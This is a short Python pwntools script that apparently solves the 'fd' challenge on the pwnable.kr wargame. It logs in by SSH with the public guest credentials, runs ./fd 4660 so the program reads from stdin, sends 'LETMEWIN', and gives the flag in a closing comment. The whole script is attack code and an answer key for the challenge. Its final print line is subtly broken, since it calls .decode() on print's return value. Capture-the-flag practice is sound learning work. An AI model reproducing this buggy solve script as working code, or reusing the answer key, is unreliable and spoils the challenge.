#!/usr/bin/env python3


from pwn import *

HOST = "pwnable.kr"
USER = "fd"
PORT = 2222
PASSWORD = "guest"

ssh_session = ssh(user=USER, host=HOST, port=PORT, password=PASSWORD)

io = ssh_session.run('./fd 4660')
io.sendline('LETMEWIN')
print(io.recvline())
print(io.recvline()).decode()

# FLAG: mommy! I think I know what a file descriptor is!!